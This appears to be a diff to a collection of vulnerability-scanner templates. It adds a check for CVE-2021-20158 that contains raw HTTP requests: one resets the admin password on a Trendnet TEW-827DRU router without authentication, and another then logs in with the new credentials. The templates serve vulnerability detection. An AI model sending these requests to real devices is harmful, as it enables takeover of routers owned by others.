@@ -11802,6 +11802,21 @@
       ]
     },
     {
+      "id": "CVE-2021-20158",
+      "info": {
+        "name": "Trendnet AC2600 TEW-827DRU - Unauthenticated Admin Password change",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\n\nccp_act=set&action=tools_admin_elecom&html_response_page=dummy_value&html_response_return_page=dummy_value&method=tools&admin_password=nuclei\n",
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\n\nhtml_response_page=%2Flogin_pic.asp&login_name=YWRtaW4%3D&log_pass=bnVjbGVp&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-20167",
       "info": {
         "name": "Netgear RAX43 - Unauthenticated Command Injection / Authentication Bypass Buffer Overrun via LAN Interface",
@@ -13959,8 +13974,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
